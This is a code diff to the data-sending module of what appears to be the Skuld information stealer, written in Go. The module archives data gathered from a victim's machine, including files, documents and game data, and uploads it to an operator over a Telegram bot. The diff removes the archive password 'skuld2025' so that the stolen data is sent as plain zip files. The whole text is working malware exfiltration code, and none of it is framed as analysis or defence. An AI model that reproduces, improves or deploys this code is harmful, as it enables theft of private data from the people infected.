@@ -85,15 +85,12 @@ func (dc *DataCollector) SendCollectedData() error {
 	archiveName := fmt.Sprintf("skuld-data_%s.zip", timestamp)
 	archivePath := filepath.Join(os.TempDir(), archiveName)
 	
-	// Create password-protected archive
-	password := "skuld2025"
-	
 	// Check if temp directory has content
 	if files, err := os.ReadDir(dc.TempDir); err != nil || len(files) == 0 {
 		return fmt.Errorf("no data to archive")
 	}
 	
-	if err := fileutil.ZipWithPassword(dc.TempDir, archivePath, password); err != nil {
+	if err := fileutil.Zip(dc.TempDir, archivePath); err != nil {
 		return fmt.Errorf("failed to create archive: %v", err)
 	}
 
@@ -115,7 +112,6 @@ func (dc *DataCollector) SendCollectedData() error {
 📦 **Archive Details:**
 • File: %s
 • Size: %.2f MB
-• Password: %s
 • Modules: %d
 
 🎯 **Collection Summary:**
@@ -127,12 +123,11 @@ func (dc *DataCollector) SendCollectedData() error {
 ✅ Common Files & Documents
 ✅ Games Data
 
-🔐 **Security:** Archive is password protected
 ⚡ **Status:** All modules executed successfully
 
 📋 **Contents:**
 %s`, 
-		archiveName, fileSizeMB, password, dc.dataCount, dc.getDirectoryTree())
+		archiveName, fileSizeMB, dc.dataCount, dc.getDirectoryTree())
 
 	// Try to send archive via Telegram
 	maxRetries := 3
@@ -162,10 +157,9 @@ func (dc *DataCollector) SendCollectedData() error {
 
 🚀 **Next Steps:**
 1. Download and extract the archive
-2. Use password: %s
-3. Check each folder for collected data
+2. Check each folder for collected data
 
-⚠️ **Note:** Keep this data secure and delete after use`, password)
+⚠️ **Note:** Keep this data secure and delete after use`)
 
 	dc.TelegramBot.SendMessage(infoMessage)
 
@@ -195,7 +189,7 @@ func (dc *DataCollector) SendDataInParts() error {
 		archivePath := filepath.Join(os.TempDir(), archiveName)
 
 		// Create archive for this module
-		if err := fileutil.ZipWithPassword(modulePath, archivePath, "skuld2025"); err != nil {
+		if err := fileutil.Zip(modulePath, archivePath); err != nil {
 			continue
 		}
 
@@ -206,7 +200,7 @@ func (dc *DataCollector) SendDataInParts() error {
 			continue
 		}
 
-		caption := fmt.Sprintf("📦 **%s Module Data**\nPassword: skuld2025", strings.Title(dir.Name()))
+		caption := fmt.Sprintf("📦 **%s Module Data**", strings.Title(dir.Name()))
 		
 		// Send this module's data
 		if err := dc.TelegramBot.SendDocument(archivePath, caption); err == nil {
